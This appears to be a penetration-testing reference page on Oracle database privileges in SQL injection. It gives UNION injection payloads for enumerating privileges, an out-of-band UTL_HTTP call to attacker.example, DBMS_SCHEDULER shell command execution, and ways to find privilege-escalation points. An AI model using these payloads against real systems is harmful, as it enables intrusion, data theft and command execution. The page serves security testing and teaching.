---
title: Privileges
description: Analyzing and exploiting Oracle database privileges in SQL injection
category: Information Gathering
order: 12
tags: ["privileges", "escalation", "administration", "security"]
lastUpdated: 2026-10-08
---

The privileges of the database account behind an injectable query decide what an attacker can read and do. Oracle has four kinds:

| Privilege Type    | Description                                     | Examples                                            | Where to look                                      |
| ----------------- | ----------------------------------------------- | --------------------------------------------------- | -------------------------------------------------- |
| System privileges | Database-wide actions                           | `CREATE SESSION`, `CREATE ANY TABLE`, `CREATE JOB`  | `SESSION_PRIVS`, `USER_SYS_PRIVS`                  |
| Object privileges | Access to one object, including PL/SQL packages | `SELECT` on a table, `EXECUTE` on `UTL_FILE`        | `USER_TAB_PRIVS`, `ALL_TAB_PRIVS`                  |
| Roles             | Named groups of privileges                      | `DBA`, `CONNECT`, `RESOURCE`, `SELECT_CATALOG_ROLE` | `USER_ROLE_PRIVS`, `SESSION_ROLES`                 |
| Administrative    | Connections as `SYSDBA`, `SYSOPER` and similar  | `SYSDBA`                                            | `SYS_CONTEXT('USERENV','ISDBA')`, `V$PWFILE_USERS` |

`EXECUTE` on a package is an object privilege, and many are granted to `PUBLIC` rather than to the user: look for them in `ALL_TAB_PRIVS` with `grantee = 'PUBLIC'`.

## Enumerating Current Privileges

Any user can read these views:

```sql
-- Every system privilege active in the session, including those from roles
SELECT * FROM SESSION_PRIVS

-- Roles granted directly, and roles enabled in the session
SELECT * FROM USER_ROLE_PRIVS
SELECT * FROM SESSION_ROLES

-- Object privileges granted to the user or to PUBLIC on interesting packages
SELECT table_name, privilege, grantee FROM ALL_TAB_PRIVS
WHERE table_name IN ('UTL_FILE','UTL_HTTP','DBMS_SCHEDULER','DBMS_JAVA') AND grantee IN ('PUBLIC', USER)
```

## SQL Injection Examples

The UNION examples assume a string injection point in a query returning two string columns.

### Checking Admin Access

```sql
-- Has the user the DBA role?
' UNION SELECT CASE WHEN EXISTS (SELECT 1 FROM USER_ROLE_PRIVS WHERE GRANTED_ROLE='DBA') THEN 'DBA' ELSE 'NO DBA' END, NULL FROM dual--

-- Is the session connected AS SYSDBA? (SYSDBA is not a system privilege, so it is not in USER_SYS_PRIVS)
' UNION SELECT SYS_CONTEXT('USERENV','ISDBA'), NULL FROM dual--

-- Session privileges, one row each
' UNION SELECT PRIVILEGE, NULL FROM SESSION_PRIVS--
```

### Enumerating All Users' Privileges

The `DBA_` views need the `DBA` role or `SELECT_CATALOG_ROLE`. Their user column is `GRANTEE`:

```sql
' UNION SELECT GRANTEE || ' - ' || PRIVILEGE, NULL FROM DBA_SYS_PRIVS--

-- Who has the DBA role?
' UNION SELECT GRANTEE, NULL FROM DBA_ROLE_PRIVS WHERE GRANTED_ROLE='DBA'--

-- Accounts allowed to connect AS SYSDBA
' UNION SELECT USERNAME, NULL FROM V$PWFILE_USERS--
```

## Exploiting Powerful Privileges

The packages below are called from PL/SQL. A SQL injection inside a `SELECT` cannot run a PL/SQL block (`' BEGIN ... END;--` is a syntax error there), so these snippets apply when the injection point is itself PL/SQL, for example input concatenated into `EXECUTE IMMEDIATE 'BEGIN ... END;'`, or after gaining a direct connection.

### File System Access

`UTL_FILE` works on directory objects (`ALL_DIRECTORIES`), not arbitrary paths, and needs `READ`/`WRITE` on the directory. `GET_LINE` and `PUT_LINE` are procedures, so files cannot be read with a plain `SELECT`.

```sql
-- Which directory objects can the user see?
SELECT directory_name, directory_path FROM ALL_DIRECTORIES
```

```sql
-- Write a file (PL/SQL)
DECLARE
  fh UTL_FILE.FILE_TYPE;
BEGIN
  fh := UTL_FILE.FOPEN('DATA_PUMP_DIR', 'output.txt', 'w');
  UTL_FILE.PUT_LINE(fh, 'content');
  UTL_FILE.FCLOSE(fh);
END;
```

### Network Access

`EXECUTE` on `UTL_HTTP` is granted to `PUBLIC` on current releases (not on 11g XE), and `UTL_HTTP.REQUEST` is a function, so it can run from a query. Since Oracle 11g it also needs a network ACL entry for the user; without one it fails with `ORA-24247`. See [Out of Band Channeling](/oracle/out-of-band-channeling).

```sql
' UNION SELECT UTL_HTTP.REQUEST('http://attacker.example/'), NULL FROM dual--
```

### Command Execution

`DBMS_SCHEDULER` runs operating system programs with job type `EXECUTABLE`. That needs the `CREATE JOB` and `CREATE EXTERNAL JOB` system privileges (both included in `DBA`), and the job runs as the operating system user configured for external jobs. The program receives its arguments directly, without a shell, so redirection needs an explicit shell:

```sql
-- PL/SQL: run "id > /tmp/out.txt" on a Unix host (use cmd.exe and /c on Windows)
BEGIN
  DBMS_SCHEDULER.CREATE_JOB(job_name => 'CMD_JOB', job_type => 'EXECUTABLE',
    job_action => '/bin/sh', number_of_arguments => 2, enabled => FALSE, auto_drop => TRUE);
  DBMS_SCHEDULER.SET_JOB_ARGUMENT_VALUE('CMD_JOB', 1, '-c');
  DBMS_SCHEDULER.SET_JOB_ARGUMENT_VALUE('CMD_JOB', 2, 'id > /tmp/out.txt');
  DBMS_SCHEDULER.ENABLE('CMD_JOB');
END;
```

### Java in the Database

Java stored procedures can also run operating system commands, but only when the Oracle JVM is installed (it is not in every edition or image) and the user has been granted Java permissions such as `JAVASYSPRIV` or a `java.io.FilePermission` through `DBMS_JAVA.GRANT_PERMISSION`. `CREATE PROCEDURE` alone is not enough.

```sql
-- Is the JVM installed? (0 means no Java classes)
' UNION SELECT TO_CHAR(COUNT(*)), NULL FROM ALL_OBJECTS WHERE OBJECT_TYPE LIKE 'JAVA%'--
```

## Privilege Escalation

### Finding PL/SQL Injection Points

Definer's rights code runs with its owner's privileges, so a PL/SQL injection in a definer's rights procedure owned by a more privileged user is an escalation path:

```sql
-- Definer's rights procedures and packages outside Oracle-maintained schemas (12.1.0.2+)
' UNION SELECT OWNER || '.' || OBJECT_NAME, OBJECT_TYPE FROM ALL_PROCEDURES WHERE AUTHID='DEFINER' AND OWNER NOT IN (SELECT USERNAME FROM ALL_USERS WHERE ORACLE_MAINTAINED='Y')--

-- Code that builds dynamic SQL
' UNION SELECT OWNER || '.' || NAME, TEXT FROM ALL_SOURCE WHERE UPPER(TEXT) LIKE '%EXECUTE IMMEDIATE%'--
```

### Privileges Inherited Through Roles

```sql
-- System privileges of the roles granted to the current user (needs DBA_SYS_PRIVS access)
' UNION SELECT GRANTEE, PRIVILEGE FROM DBA_SYS_PRIVS WHERE GRANTEE IN (SELECT GRANTED_ROLE FROM USER_ROLE_PRIVS)--

-- Privilege-related dictionary views
' UNION SELECT TABLE_NAME, COMMENTS FROM DICTIONARY WHERE TABLE_NAME LIKE '%PRIV%'--
```
